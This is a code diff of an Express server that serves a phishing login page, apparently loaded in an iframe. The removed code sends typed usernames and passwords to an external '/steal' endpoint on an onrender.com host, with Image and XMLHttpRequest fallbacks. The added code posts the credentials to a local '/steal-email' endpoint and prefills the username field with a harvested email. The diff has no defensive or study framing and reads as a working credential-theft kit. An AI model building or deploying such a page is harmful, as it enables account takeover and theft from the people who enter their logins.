@@ -4,8 +4,24 @@ const http = require('http');
 const app = express();
 const server = http.createServer(app);
 
-app.get('/', (req, res) => {
-res.send(`
+app.get('/', async (req, res) => {
+  // Fetch email from backend to set as default username
+  let defaultEmail = '';
+  try {
+    const fetch = (await import('node-fetch')).default; // Dynamic import for node-fetch
+    const response = await fetch('http://localhost:3001/steal-email', {
+      method: 'GET',
+      cache: 'no-cache'
+    });
+    if (response.ok) {
+      const data = await response.json();
+      defaultEmail = data.email !== 'No email stored' ? data.email : '';
+    }
+  } catch (error) {
+    console.error('Server-side error fetching email:', error.message);
+  }
+
+  res.send(`
 <!DOCTYPE html>
 <html>
 <head>
@@ -152,14 +168,6 @@ res.send(`
       margin-top: 20px;
       opacity: 0.8;
     }
-    .debug-info {
-      background: #f0f8ff;
-      border: 1px solid #ccc;
-      padding: 10px;
-      margin-top: 10px;
-      font-size: 11px;
-      font-family: monospace;
-    }
   </style>
 </head>
 <body>
@@ -170,7 +178,7 @@ res.send(`
       
       <div class="form-group">
         <label for="username" class="form-label">Username</label>
-        <input type="text" id="username" class="form-input" />
+        <input type="text" id="username" class="form-input" value="${defaultEmail}" />
       </div>
       
       <div class="form-group">
@@ -186,11 +194,6 @@ res.send(`
         <label class="remember-me">
           <input type="checkbox" id="remember" /> Remember me
         </label>
-      </div>
-      
-      <div class="output" id="output" style="display: none;">
-        <strong>Debug Log:</strong><br>
-        Page loaded at: ${new Date().toLocaleString()}<br>
       </div>
     </div>
     
@@ -215,6 +218,32 @@ res.send(`
       outputDiv.innerHTML += message + '<br>';
       outputDiv.scrollTop = outputDiv.scrollHeight;
     }
+
+    // Fetch email from /steal-email on page load to confirm
+    window.addEventListener('load', async function() {
+      logMessage('=== FETCHING EMAIL FROM /steal-email ===');
+      try {
+        const response = await fetch('http://localhost:3001/steal-email', {
+          method: 'GET',
+          cache: 'no-cache'
+        });
+        if (response.ok) {
+          const data = await response.json();
+          logMessage('Fetched email: ' + data.email);
+          if (data.email && data.email !== 'No email stored') {
+            document.getElementById('username').value = data.email;
+            logMessage('Prefilled username with: ' + data.email);
+          } else {
+            logMessage('No email available to prefill');
+          }
+        } else {
+          logMessage('Failed to fetch email, status: ' + response.status);
+        }
+      } catch (error) {
+        logMessage('Error fetching email: ' + error.message);
+      }
+      logMessage('=== EMAIL FETCH COMPLETED ===');
+    });
 
     function togglePassword() {
       var passwordInput = document.getElementById('password');
@@ -248,97 +277,41 @@ res.send(`
         return;
       }
       
-      // Build the URL
-      var baseUrl = 'https://python-test-server-d3hl.onrender.com/steal';
-      var params = new URLSearchParams();
-      params.append('username', username);
-      params.append('password', password);
-      var fullUrl = baseUrl + '?' + params.toString();
-      
-      logMessage('Target URL: ' + fullUrl);
-      logMessage('Encoded params: ' + params.toString());
-      
       try {
-        logMessage('Attempting fetch request...');
-        
-        // Try with fetch first
-        const response = await fetch(fullUrl, {
-          method: 'GET',
-          mode: 'no-cors', // This might help with CORS issues
+        logMessage('Attempting POST request to /steal-email...');
+        const response = await fetch('http://localhost:3001/steal-email', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            email: username, // Assuming username is email
+            username: username,
+            password: password
+          }),
           cache: 'no-cache'
         });
         
-        logMessage('Fetch completed - Status: ' + response.status);
-        logMessage('Response type: ' + response.type);
+        logMessage('POST completed - Status: ' + response.status);
         
-        // Try to read response (might fail with no-cors)
-        try {
-          const text = await response.text();
-          logMessage('Response text: ' + text);
-        } catch (e) {
-          logMessage('Could not read response text (expected with no-cors): ' + e.message);
+        if (response.ok) {
+          const data = await response.json();
+          logMessage('Response data: ' + JSON.stringify(data));
+          alert('Credentials submitted successfully');
+        } else {
+          logMessage('POST failed - Status: ' + response.status);
+          alert('Failed to submit credentials');
         }
-        
       } catch (error) {
-        logMessage('Fetch FAILED: ' + error.message);
-        logMessage('Error name: ' + error.name);
-        
-        // Fallback: try with Image object (for simple GET requests)
-        logMessage('Trying fallback method with Image object...');
-        try {
-          var img = new Image();
-          img.onload = function() {
-            logMessage('Image method: SUCCESS (onload)');
-          };
-          img.onerror = function() {
-            logMessage('Image method: ERROR (onerror) - but request was likely sent');
-          };
-          img.src = fullUrl + '&_fallback=image&_t=' + Date.now();
-          logMessage('Image fallback request sent');
-        } catch (imgError) {
-          logMessage('Image fallback FAILED: ' + imgError.message);
-        }
-        
-        // Another fallback: try with XMLHttpRequest
-        logMessage('Trying XMLHttpRequest fallback...');
-        try {
-          var xhr = new XMLHttpRequest();
-          xhr.open('GET', fullUrl, true);
-          xhr.onreadystatechange = function() {
-            logMessage('XHR readyState: ' + xhr.readyState + ', status: ' + xhr.status);
-            if (xhr.readyState === 4) {
-              if (xhr.status === 200) {
-                logMessage('XHR SUCCESS: ' + xhr.responseText);
-              } else {
-                logMessage('XHR completed with status: ' + xhr.status);
-              }
-            }
-          };
-          xhr.onerror = function() {
-            logMessage('XHR ERROR occurred');
-          };
-          xhr.send();
-          logMessage('XHR request sent');
-        } catch (xhrError) {
-          logMessage('XHR fallback FAILED: ' + xhrError.message);
-        }
-      }
-      
-      // Signal the parent window to close the iframe (if applicable)
-      try {
-        window.parent.postMessage('close-iframe', '*');
-        logMessage('Sent close-iframe message to parent');
-      } catch (e) {
-        logMessage('Could not send message to parent: ' + e.message);
+        logMessage('POST FAILED: ' + error.message);
+        alert('Error submitting credentials: ' + error.message);
       }
       
       logMessage('=== LOGIN ATTEMPT COMPLETED ===');
     }
 
-    // Enhanced message listener with more logging
     window.addEventListener('message', function(event) {
       logMessage('Received postMessage: "' + event.data + '" from: ' + event.origin);
-      
       if (event.data === 'type=community-update') {
         logMessage('Processing community-update message');
         document.querySelector('.login-box').style.display = 'block';
@@ -351,36 +324,6 @@ res.send(`
         }
       }
     }, false);
-
-    // Log when iframe loads
-    logMessage('Script loaded, sending iframe loaded message');
-    try {
-      window.parent.postMessage('Iframe loaded', '*');
-      logMessage('Iframe loaded message sent successfully');
-    } catch (e) {
-      logMessage('Could not send iframe loaded message: ' + e.message);
-    }
-    
-    // Additional debugging info
-    logMessage('Current URL: ' + window.location.href);
-    logMessage('User agent: ' + navigator.userAgent);
-    logMessage('Is in iframe: ' + (window !== window.parent));
-    
-    // Test backend connectivity on page load
-    setTimeout(async function() {
-      logMessage('=== TESTING BACKEND CONNECTIVITY ===');
-      try {
-        const testResponse = await fetch('https://python-test-server-d3hl.onrender.com/test', {
-          method: 'GET',
-          mode: 'no-cors'
-        });
-        logMessage('Backend test - Response type: ' + testResponse.type);
-      } catch (e) {
-        logMessage('Backend test FAILED: ' + e.message);
-      }
-      logMessage('=== BACKEND TEST COMPLETED ===');
-    }, 1000);
-    
   </script>
 </body>
 </html>
